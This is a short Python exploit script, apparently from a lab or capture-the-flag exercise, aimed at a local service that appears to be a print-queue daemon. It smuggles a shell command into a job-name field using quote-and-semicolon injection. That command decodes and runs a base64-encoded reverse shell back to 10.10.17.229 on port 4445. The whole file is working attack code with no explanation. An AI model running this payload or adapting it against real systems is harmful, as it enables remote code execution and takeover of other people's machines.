import socket
import threading
import subprocess
import os
import base64

ip="127.0.0.1"
port=1515
data_bytes=b"bash -i >& /dev/tcp/10.10.17.229/4445 0>&1"
if __name__ == "__main__":
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server.connect((ip, port))
	server.send(b'\x02archive_intake')	
	context=server.recv(1024)
	print(context)
	encoded_bytes = base64.b64encode(data_bytes)
	JobName="J';echo " + encoded_bytes.decode() + " | base64 -d | bash;echo '1"
	blen = len(JobName)
	print(blen)
	server.send(f"\x02{blen}".encode())
	content=server.recv(1024)
	print(content)
	server.send(JobName.encode())
	content=server.recv(1024)
	print(content)
	server.close()